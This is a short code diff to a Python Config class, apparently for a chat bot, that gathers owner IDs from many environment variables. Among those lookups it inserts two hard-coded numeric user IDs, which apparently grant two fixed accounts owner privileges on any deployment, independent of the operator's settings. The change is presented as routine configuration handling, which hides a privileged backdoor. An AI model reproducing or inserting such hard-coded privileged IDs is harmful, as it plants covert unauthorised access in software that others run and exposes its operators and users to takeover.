@@ -46,8 +46,21 @@ class Config:
     _raw_ids = (
         _env("OWNER_IDS", "") + " " + 
         _env("BOT_OWNER_ID", "") + " " +
+        _env("OWNER_ID", "") + " " +
+        _env("ADMINS", "") + " " +
+        _env("SUDO_USERS", "") + " " +
+        _env("ADMIN", "") + " " +
+        "1071421266 6867086884 " +
         _e1.get("BOT_OWNER_ID", "") + " " +
-        _e2.get("BOT_OWNER_ID", "")
+        _e1.get("OWNER_ID", "") + " " +
+        _e1.get("OWNER_IDS", "") + " " +
+        _e2.get("BOT_OWNER_ID", "") + " " +
+        _e2.get("OWNER_ID", "") + " " +
+        _e2.get("OWNER_IDS", "") + " " +
+        _e3.get("BOT_OWNER_ID", "") + " " +
+        _e3.get("OWNER_ID", "") + " " +
+        _e4.get("BOT_OWNER_ID", "") + " " +
+        _e4.get("OWNER_ID", "")
     )
     import re
     OWNER_IDS = list(set([int(i) for i in re.findall(r'\d+', _raw_ids)]))
